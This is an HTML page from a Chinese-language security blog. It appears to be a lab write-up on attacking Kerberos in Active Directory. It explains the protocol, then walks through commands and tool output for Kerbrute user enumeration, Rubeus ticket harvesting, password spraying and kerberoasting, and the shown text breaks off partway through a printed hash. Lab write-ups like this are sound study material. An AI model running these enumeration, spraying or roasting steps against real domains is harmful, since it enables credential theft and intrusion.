@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="z4yn的博客">
+    <meta property="og:type" content="website">
+    <meta name="description" content="z4yn的博客">
+    <meta name="keyword"  content="OSCP,PTE">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        Attacking Kerberos - Z4yn&#39;s blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Z4yn's blog" type="application/atom+xml">
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> Better to light one candle than to curse the darkness. </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>Z4yn&#39;s blog</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>收藏</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Attacking-Kerberos"><span class="toc-text">Attacking Kerberos</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%8B%E7%BB%8D"><span class="toc-text">#1 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-Kerberos%EF%BC%9F"><span class="toc-text">什么是 Kerberos？-</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD"><span class="toc-text">常用术语 -</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E7%9A%84%E5%B8%A6%E9%A2%84%E8%AE%A4%E8%AF%81%E7%9A%84-AS-REQ"><span class="toc-text">详细的带预认证的 AS-REQ -</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE%E6%8E%88%E4%BA%88%E7%A5%A8%E6%8D%AE%E5%86%85%E5%AE%B9"><span class="toc-text">票据授予票据内容 -</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%8D%95%E5%86%85%E5%AE%B9"><span class="toc-text">服务单内容 -</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerberos-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%A6%82%E8%BF%B0"><span class="toc-text">Kerberos 身份验证概述 -</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9D%83%E9%99%90%E8%A6%81%E6%B1%82"><span class="toc-text">攻击权限要求 -</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Kerbrute-%E6%9E%9A%E4%B8%BE"><span class="toc-text">#2 Kerbrute 枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%94%A8-Rubeus-%E8%8E%B7%E5%8F%96%E7%A5%A8%E6%8D%AE-amp-%E7%A0%B4%E8%A7%A3%E7%A5%A8%E6%8D%AE"><span class="toc-text">#3 用 Rubeus 获取票据 &amp; 破解票据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Rubeus-%E8%8E%B7%E5%8F%96%E7%A5%A8%E6%8D%AE"><span class="toc-text">Rubeus 获取票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Rubeus-%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-text">使用 Rubeus 进行暴力破解&#x2F;密码喷洒 -</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%94%A8Rubeus-%E5%92%8C-Impacket-%E8%BF%9B%E8%A1%8C-Kerberoasting"><span class="toc-text">#4 用Rubeus 和 Impacket 进行 Kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Rubeus"><span class="toc-text">Rubeus</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Impacket"><span class="toc-text">Impacket</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3hash"><span class="toc-text">破解hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%B8%90%E6%88%B7%E5%8F%AF%E4%BB%A5%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">服务帐户可以做什么？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%94%A8Rubeus%E8%BF%9B%E8%A1%8CAS-REP-Roasting"><span class="toc-text">#5 用Rubeus进行AS-REP Roasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Rubeus-1"><span class="toc-text">Rubeus</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#impacket-GetNPUsers"><span class="toc-text">impacket-GetNPUsers</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hashcat-%E7%A0%B4%E8%A7%A3hash"><span class="toc-text">Hashcat 破解hash</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E4%BD%BF%E7%94%A8-mimikatz-%E4%BC%A0%E9%80%92%E7%A5%A8%E6%8D%AE"><span class="toc-text">#6使用 mimikatz 传递票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-mimikatz-%E9%87%91-%E9%93%B6%E7%A5%A8%E6%94%BB%E5%87%BB"><span class="toc-text">#7 mimikatz 金&#x2F;银票攻击</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> Better to light one candle than to curse the darkness. </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        Attacking Kerberos
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2022-11-07 15:44:16</span></span>
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <h1 id="Attacking-Kerberos"><a href="#Attacking-Kerberos" class="headerlink" title="Attacking Kerberos"></a><strong>Attacking Kerberos</strong></h1><ul>
+<li>使用 Kerbrute 和 Rubeus 等工具进行初始枚举</li>
+<li>kerberoasting</li>
+<li>使用 Rubeus 和 Impacket 进行 AS-REP 烘焙</li>
+<li>金/银票攻击</li>
+<li>传票</li>
+<li>使用 mimikatz 的万能钥匙攻击</li>
+</ul>
+<h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="#1 介绍"></a>#1 介绍</h2><h4 id="什么是-Kerberos？"><a href="#什么是-Kerberos？" class="headerlink" title="什么是 Kerberos？-"></a>什么是 Kerberos？-</h4><p>Kerberos 是 Microsoft Windows 域的默认身份验证服务。通过使用第三方票据授权以及更强的加密，它旨在比 NTLM 更“安全”。尽管 NTLM 有更多的攻击向量可供选择，但 Kerberos 仍然有一些潜在的漏洞，就像我们可以利用的 NTLM 一样。</p>
+<h4 id="常用术语"><a href="#常用术语" class="headerlink" title="常用术语 -"></a>常用术语 -</h4><ul>
+<li><strong>Ticket Granting Ticket 票据授予票据 (TGT)</strong> - 票据授予票据是一种身份验证票据，用于从 TGS 向域中的特定资源请求服务票据。</li>
+<li><strong>Key Distribution Center 密钥分发中心 (KDC)</strong> - 密钥分发中心是一种用于发布 TGT 和服务票据的服务，包括身份验证服务和票据授予服务。</li>
+<li><strong>Authentication Service 身份验证服务</strong> <strong>(AS)</strong> - 身份验证服务发出 TGT 以供域中的 TGS 使用， 以请求访问其他机器和服务票据。</li>
+<li><strong>Ticket Granting Service 票据授予服务 (TGS)</strong> - 票据授予服务获取 TGT 并将票据返回到域上的机器。</li>
+<li><strong>Service Principal Name 服务主体名称 (SPN)</strong> - 服务主体名称是提供给服务实例的标识符，用于将服务实例与域服务帐户相关联。Windows 要求服务具有域服务帐户，这就是服务需要 SPN 集的原因。</li>
+<li><strong>KDC Long Term Secret Key KDC 长期密钥 (KDC LT Key)</strong> - KDC 密钥基于 KRBTGT 服务帐户。它用于加密 TGT 和签署 PAC。</li>
+<li><strong>Client Long Term Secret Key 客户端长期密钥（客户端 LT 密钥）</strong> - 客户端密钥基于计算机或服务帐户。它用于检查加密的时间戳并加密会话密钥。</li>
+<li><strong>Service Long Term Secret Key 服务端长期密钥 (Service LT Key)</strong> - 服务密钥基于服务帐户。它用于加密服务票据的服务部分并签署 PAC。</li>
+<li><strong>Session Key 会话密钥</strong>- 在发布 TGT 时由 KDC 发布。用户在请求服务票据时将向 KDC 提供会话密钥以及 TGT。</li>
+<li><strong>Privilege Attribute Certificate 特权属性证书 (PAC)</strong> - PAC 保存用户的所有相关信息，它与 TGT 一起发送到 KDC，由目标 LT 密钥和 KDC LT 密钥签名，以验证用户。</li>
+</ul>
+<h4 id="详细的带预认证的-AS-REQ"><a href="#详细的带预认证的-AS-REQ" class="headerlink" title="详细的带预认证的 AS-REQ -"></a>详细的带预认证的 AS-REQ -</h4><p>当用户从 KDC 请求 TGT 时，Kerberos 身份验证中的 AS-REQ 步骤开始。为了验证用户并为用户创建 TGT，KDC 必须遵循这些确切的步骤。第一步是用户加密时间戳 NT 哈希并将其发送到 AS。KDC 尝试使用来自用户的 NT 散列来解密时间戳，如果成功，KDC 将为用户发布 TGT 以及会话密钥。</p>
+<h4 id="票据授予票据内容"><a href="#票据授予票据内容" class="headerlink" title="票据授予票据内容 -"></a>票据授予票据内容 -</h4><p>为了了解服务票证是如何创建和验证的，我们需要从票证的来源开始；TGT 由用户提供给 KDC，作为回报，KDC 验证 TGT 并返回服务票证。</p>
+<img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/0e6df39b088b69673b03bf3ba4606e9d.png" alt="image-20220531094650428" style="zoom: 25%;" />
+
+
+
+<h4 id="服务单内容"><a href="#服务单内容" class="headerlink" title="服务单内容 -"></a>服务单内容 -</h4><p>要了解 Kerberos 身份验证的工作原理，您首先需要了解这些票证包含什么以及如何验证它们。服务票据包含两部分：服务提供部分和用户提供部分。我会把它分解成每个部分包含的内容。</p>
+<ul>
+<li>服务部分：用户详细信息、会话密钥、使用服务帐户 NTLM 哈希加密票证。</li>
+<li>用户部分：有效性时间戳、会话密钥、使用 TGT 会话密钥加密。</li>
+</ul>
+<img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/2102ff15e7476be481beb1a7e029d389.png" alt="image-20220531094824478" style="zoom:25%;" />
+
+
+
+<h4 id="Kerberos-身份验证概述"><a href="#Kerberos-身份验证概述" class="headerlink" title="Kerberos 身份验证概述 -"></a>Kerberos 身份验证概述 -</h4><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/ec06eb18c6e11e863afe6c47c937e3a9.png" alt="image-20220531094906872" style="zoom: 50%;" />
+
+<p>AS-REQ - 1.) 客户端请求身份验证票证或票证授予票证 (TGT)。</p>
+<p>AS-REP - 2.) 密钥分发中心验证客户端并发回加密的 TGT。</p>
+<p>TGS-REQ - 3.) 客户端将加密的 TGT 与客户端想要访问的服务的服务主体名称 (SPN) 一起发送到票证授予服务器 (TGS)。</p>
+<p>TGS-REP - 4.) 密钥分发中心 (KDC) 验证用户的 TGT 以及用户有权访问服务，然后向客户端发送服务的有效会话密钥。</p>
+<p>AP-REQ - 5.) 客户端请求服务并发送有效会话密钥以证明用户具有访问权限。</p>
+<p>AP-REP - 6.) 服务授予访问权限</p>
+<h4 id="攻击权限要求"><a href="#攻击权限要求" class="headerlink" title="攻击权限要求 -"></a>攻击权限要求 -</h4><ul>
+<li>Kerbrute 枚举 - 无需域访问 </li>
+<li>传递票证 - 以用户身份访问所需的域</li>
+<li>Kerberoasting - 以任何需要的用户身份访问</li>
+<li>AS-REP Roasting - 以任何需要的用户身份访问</li>
+<li>Golden Ticket - 需要完整的域妥协（域管理员） </li>
+<li>Silver Ticket - 需要服务哈希 </li>
+<li>万能钥匙 - 需要完整的域妥协（域管理员）</li>
+</ul>
+<h2 id="2-Kerbrute-枚举"><a href="#2-Kerbrute-枚举" class="headerlink" title="#2 Kerbrute 枚举"></a>#2 Kerbrute 枚举</h2><p>kerbrute : <a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p>
+<p>user.txt : <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt">https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt</a></p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_linux_amd64 userenum -d <span class="module-access"><span class="module"><span class="identifier">CONTROLLER</span>.</span></span>local --dc <span class="number">10.10</span>.<span class="number">124.146</span> <span class="module-access"><span class="module"><span class="identifier">User</span>.</span></span>txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/3445635a22c41b4ebad87ad745bfa01e.png" alt="image-20220531110137790"></p>
+<h2 id="3-用-Rubeus-获取票据-amp-破解票据"><a href="#3-用-Rubeus-获取票据-amp-破解票据" class="headerlink" title="#3 用 Rubeus 获取票据 &amp; 破解票据"></a>#3 用 Rubeus 获取票据 &amp; 破解票据</h2><h4 id="Rubeus-获取票据"><a href="#Rubeus-获取票据" class="headerlink" title="Rubeus 获取票据"></a>Rubeus 获取票据</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe harvest /interval:30    <span class="comment"># 每30秒收获一次TGT</span></span><br><span class="line"></span><br><span class="line">CONTROLLER-1 C:\Users\Administrator\Downloads&gt;Rubeus.exe harvest /interval:30</span><br><span class="line">                                                                                                                                                                       </span><br><span class="line">  (_____ \      | |                                                                                                 </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)                                                                           </span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/                                                                                                                                               </span><br><span class="line"></span><br><span class="line">[*] Action: TGT Harvesting (with auto-renewal) </span><br><span class="line">[*] Monitoring every 30 seconds <span class="keyword">for</span> new TGTs</span><br><span class="line">[*] Displaying the working TGT cache every 30 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Refreshing TGT ticket cache (5/30/2022 7:57:25 PM)</span><br><span class="line"></span><br><span class="line">  User                  :  CONTROLLER-1<span class="variable">$@CONTROLLER</span>.LOCAL </span><br><span class="line">  StartTime             :  5/30/2022 6:26:57 PM</span><br><span class="line">  EndTime               :  5/31/2022 4:26:57 AM</span><br><span class="line">  RenewTill             :  6/6/2022 6:26:57 PM</span><br><span class="line">  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  Base64EncodedTicket   :</span><br><span class="line"></span><br><span class="line">    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr</span><br><span class="line">    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEiufD0DYuMmQCg/dSQ7ShTy7kGSlSnmPmtzR</span><br><span class="line">    ......</span><br><span class="line">    MCmgAwIBEqEiBCAzaBGdXMlb9yAiEvd5TDxkuK8shpBpRrS93/diGlyMuKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw</span><br><span class="line">    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIyMDUzMTAxMjY1N1qmERgPMjAyMjA1MzExMTI2NTdapxEYDzIwMjIwNjA3</span><br><span class="line">    MDEyNjU3WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM</span><br><span class="line"></span><br><span class="line">  User                  :  CONTROLLER-1<span class="variable">$@CONTROLLER</span>.LOCAL</span><br><span class="line">  StartTime             :  5/30/2022 6:26:57 PM</span><br><span class="line">  EndTime               :  5/31/2022 4:26:57 AM</span><br><span class="line">  RenewTill             :  6/6/2022 6:26:57 PM</span><br><span class="line">  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable</span><br><span class="line">  Base64EncodedTicket   :</span><br><span class="line"></span><br><span class="line">    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr</span><br><span class="line">    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEpl0EQ1mPJUIoWWPlW9vQCv5BjpYk/UdQ16F</span><br><span class="line">    ......</span><br><span class="line">    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDIyMDUzMTAxMjY1N1qmERgPMjAyMjA1MzExMTI2NTdapxEYDzIwMjIwNjA3</span><br><span class="line">    MDEyNjU3WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM</span><br><span class="line"></span><br><span class="line">  User                  :  Administrator@CONTROLLER.LOCAL</span><br><span class="line">  StartTime             :  5/30/2022 7:47:33 PM</span><br><span class="line">  EndTime               :  5/31/2022 5:47:33 AM</span><br><span class="line">  RenewTill             :  6/6/2022 7:47:33 PM</span><br><span class="line">  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  Base64EncodedTicket   :</span><br><span class="line"></span><br><span class="line">    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr</span><br><span class="line">    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGskQlYMSWETwhc7mgPsK7FDZYoVI8F4VS/pl</span><br><span class="line">	......</span><br><span class="line">    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjIwNTMxMDI0NzMzWqYRGA8yMDIyMDUzMTEyNDczM1qnERgP</span><br><span class="line">    MjAyMjA2MDcwMjQ3MzNaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="使用-Rubeus-进行暴力破解-密码喷洒"><a href="#使用-Rubeus-进行暴力破解-密码喷洒" class="headerlink" title="使用 Rubeus 进行暴力破解/密码喷洒 -"></a>使用 Rubeus 进行暴力破解/密码喷洒 -</h4><p>在使用 Rubeus 进行密码喷洒之前，您需要将域控制器域名添加到 windows 主机文件中。您可以使用 echo 命令将 IP 和域名添加到机器中的 hosts 文件中： </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 10.10.124.146 CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</span><br><span class="line"></span><br><span class="line">Rubeus.exe brute /password:Password1 /noticket  <span class="comment"># 这将采用给定的密码并将其喷洒给所有找到的用户，然后为该用户提供 .kirbi TGT</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">controller\administrator@CONTROLLER-<span class="number">1</span> C:\Users\Administrator\Downloads&gt;<span class="built_in">echo</span> <span class="number">10</span>.<span class="number">10</span>.<span class="number">124</span>.<span class="number">146</span> CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</span><br><span class="line">controller\administrator@CONTROLLER-<span class="number">1</span> C:\Users\Administrator\Downloads&gt;Rubeus.exe brute /password:Password1 /noticket</span><br><span class="line">   ______        _  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line">  v1.<span class="number">5</span>.<span class="number">0</span></span><br><span class="line">[-] Blocked/Disabled user =&gt; Guest</span><br><span class="line">[-] Blocked/Disabled user =&gt; krbtgt[+] STUPENDOUS =&gt; Machine1:Password1</span><br><span class="line">[*] base64(Machine1.kirbi):</span><br><span class="line">      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi     </span><br><span class="line">      ......</span><br><span class="line">      GA8yMDIyMDUzMTAzMjMzNlqmERgPMjAyMjA1MzExMzIzMzZapxEYDzIwMjIwNjA3MDMyMzM2WqgSGxBD</span><br><span class="line">      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Done</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="4-用Rubeus-和-Impacket-进行-Kerberoasting"><a href="#4-用Rubeus-和-Impacket-进行-Kerberoasting" class="headerlink" title="#4 用Rubeus 和 Impacket 进行 Kerberoasting"></a>#4 用Rubeus 和 Impacket 进行 Kerberoasting</h2><h4 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h4><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">controller\administrator<span class="meta">@CONTROLLER-1</span> C:\Users\Administrator\Downloads&gt;Rubeus.exe kerberoast</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      |<span class="string"> </span>|</span><br><span class="line">   _____) )_   _|<span class="string"> </span>|<span class="string">__  _____ _   _  ___</span></span><br><span class="line"><span class="string">  </span>|<span class="string">  __  /</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \</span>|<span class="string"> ___ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/___)</span></span><br><span class="line"><span class="string">  </span>|<span class="string"> </span>|<span class="string">  \ \</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_) ) ____</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">___ </span>|</span><br><span class="line">  |<span class="string">_</span>|<span class="string">   </span>|<span class="string">_</span>|<span class="string">____/</span>|<span class="string">____/</span>|<span class="string">_____)____/(___/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  v1.5.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Action: Kerberoasting</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] NOTICE: AES hashes will be returned for AES-enabled accounts. </span></span><br><span class="line"><span class="string">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Searching the current domain for Kerberoastable users </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Total kerberoastable users : 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] SamAccountName         : SQLService</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local </span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111</span></span><br><span class="line"><span class="string">[*] PwdLastSet             : 5/25/2020 10:28:26 PM</span></span><br><span class="line"><span class="string">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span></span><br><span class="line"><span class="string">[*] Hash                   : n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] SamAccountName         : HTTPService</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local</span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222</span></span><br><span class="line"><span class="string">[*] PwdLastSet             : 5/25/2020 10:39:17 PM</span></span><br><span class="line"><span class="string">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span></span><br><span class="line"><span class="string">[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo</span></span><br><span class="line"><span class="string">                             cal:30222*$8567C8880014354D68ACF7B9C004873B$F1EAC83F611ED876A7DB3B727430122DDC92</span></span><br><span class="line"><span 